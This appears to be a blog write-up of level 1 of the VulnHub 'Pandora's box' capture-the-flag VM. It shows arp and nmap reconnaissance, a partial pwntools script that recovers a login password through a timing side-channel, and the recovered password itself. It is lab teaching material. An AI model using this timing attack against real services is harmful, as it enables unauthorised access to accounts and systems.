### Pandoras box Level *1* of *5*



![](https://www.vulnhub.com/media/img/entry/watermarked/2c242db3c7efd1c6a0c07c3fdc4a4fc15319ed95.png)

---

![](https://cyberguru1.github.io/posts/VulnHub/images/pando_site.png)
---------------------------------------------------------------------

About:
Pandora's box is a Boot2Root VM focused on binary exploitation and
reverse engineering. You have to complete all levels to r00t the box.
Some levels come with a README file which you should read.

---

This is the first level of the challenge, an OVA file is provided in the challenge [link](https://www.vulnhub.com/entry/pandoras-box-1,111/) booting up the ova file in to VM ware player we have

![](https://cyberguru1.github.io/posts/VulnHub/images/pando.gif)

after booting up the box, we are left with a prompt to enter username and password, we tried some random guesses with no avail
well this a boot-to-root challenge my first of a kind that has to do with a combination of reveng and binary exploitation, knowing this
let's try and search for the machines IP address and scan for open ports

![](https://cyberguru1.github.io/posts/VulnHub/images/pando_ip.png)

Using the command `arp -a` we were able to get the machine IP address that I configured the network adapter binded to vmnet1 which we confirmed by comparing the shown macadress with the machine's ip address.

using this ip address let's scan the machine using NMAP we have :

![](https://cyberguru1.github.io/posts/VulnHub/images/pando_service_scan.png)

we use the NMAP command `sudo nmap -sV -SN -sC 192.168.17.129`, and we got some results, an open port to SSH on port 22/TCP, let's try a deeper scan to scan all port using the `-p-` args to the command we have::

![](https://cyberguru1.github.io/posts/VulnHub/images/pando_all_scan.png)

doing so we were able to get an additional open port running on port 54311 with service Nagios NSCA

let's try connecting to it using netcat we have ::

![](https://cyberguru1.github.io/posts/VulnHub/images/pando_login_lvl1.png)

we could see a password prompt asking us for a password, we try some random string with no luck, and then I went to google to do some reconnaissance on possible vulnerabilities for Nagios logging

<p><h5>That eureker moment!!!</h5></p>

And Whalaaaaa, we found that it's vulnerable to timing attack; In cryptography, a timing attack is a side-channel attack in which the attacker attempts to compromise a cryptosystem by analyzing the time taken to execute cryptographic algorithms. More info [here](https://en.wikipedia.org/wiki/Timing_attack)

Base on this info we could craft a Python script that connects to the remote port on 54311 using pwntools and attempts to guess the password by measuring the time it takes to receive a response from the server.

Abiding to this timing attack principle we have ::

```
#!/usr/bin/python3

from pwn import *
from time import time
from string import *

ip = "192.168.17.129"
port = 54311

sample_space =  ascii_letters + digits

p = remote(ip, port)

<!--snip>
#script incomplete
<!--snip>

while not done:
	curr_val = ''
	first = True
	for chars in sample_space:
		current = flag
		current += chars
		ttt = chcktime(current)
		ttt = chcktime(current)

		if first:
			min_diff = ttt
			first = False

		if ttt < min_diff:
			min_diff = ttt
			curr_val = chars
	
	flag += curr_val
	print(flag)
	p.sendlineafter(b":", flag.encode())
	status = p.recvuntil(b"\n")

	if b"Logged" in status:
		done = True
```

full script [here](https://cyberguru1.github.io/posts/VulnHub/images/script.py)

Here's a breakdown of the code:

- The script sets the IP address `(ip)` and port number `(port)` for the remote server.
- The `sample_space` variable contains a string of ASCII letters and digits, which will be used to construct the password.
- The script establishes a connection to the remote server using `p = remote(ip, port)`.
- The `chcktime` function measures the time it takes to receive a response from the server after sending a password attempt. It sends the password attempt, receives the server's response, and calculates the time difference between sending and receiving the response.
- The main loop of the script repeatedly selects a character from sample_space and appends it to the flag variable. It then measures the time it takes to receive a response from the server after sending the updated password attempt.
- The script keeps track of the minimum time difference `(min_diff)` and the character that resulted in the minimum time difference `(curr_val)`.
- After each iteration of the loop, the selected character is appended to the `flag` variable and sent to the server.
- If the server responds with "Logged in ", indicating that the correct password has been guessed, the loop is terminated.
- The script prints the current value of `flag` after each iteration to show the progress of the password guessing.

After running the code for a while we have:

![](https://cyberguru1.github.io/posts/VulnHub/images/pando_lvl1_flag.gif)

<p><h5>Running the script</h5></p>

This the final password:

![](https://cyberguru1.github.io/posts/VulnHub//images/pando_lvl1_flag.png)

we got the password as `R3sp3ctY04r4dm1niSt4t0rL1keYo4R3spectY04rG0d`, using this to login we have

![](https://cyberguru1.github.io/posts/VulnHub//images/pando_lvl1_sucess.png)

And boooom!!!

we are in!!!!!.....................

The next solution to level *2* would be dropped soon ..............

Arigato :<^>:
